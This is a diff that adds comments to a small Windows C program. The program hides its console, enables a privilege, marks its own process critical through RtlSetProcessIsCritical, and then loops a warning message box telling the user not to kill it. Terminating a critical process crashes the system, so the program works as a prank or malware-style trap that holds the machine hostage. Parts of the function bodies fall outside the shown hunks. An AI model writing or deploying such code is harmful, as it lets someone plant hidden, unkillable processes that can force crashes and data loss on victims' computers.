@@ -1,12 +1,12 @@
-#include <windows.h>
-#include <stdio.h>
+#include <windows.h> //default libraries for this
+#include <stdio.h> 
  
 typedef VOID ( _stdcall *RtlSetProcessIsCritical ) (
                IN BOOLEAN        NewValue,
                OUT PBOOLEAN OldValue, 
                IN BOOLEAN     IsWinlogon );
  
-BOOL EnablePriv(LPCSTR lpszPriv) 
+BOOL EnablePriv(LPCSTR lpszPriv) //enable Privilege
 {
     HANDLE hToken;
     LUID luid;
@@ -45,14 +45,14 @@ BOOL ProcessIsCritical()
    } else
           return 0;
 }
- 
+ // you need administrator permission to set a process as critical!
 int main (void)
 {
-   FreeConsole();
-   ProcessIsCritical();
+   FreeConsole(); // hiding the console
+   ProcessIsCritical(); // calling the Function
    while(1)
    {
-       MessageBoxA(NULL, "THIS PROCESS IS CRITICAL DO NOT TRY TO KILL IT", "WARNING!", MB_ICONHAND | MB_OK);
+       MessageBoxA(NULL, "THIS PROCESS IS CRITICAL DO NOT TRY TO KILL IT", "WARNING!", MB_ICONHAND | MB_OK); // then simply putting a message box after the process is critical
    }
 return 0;
 }
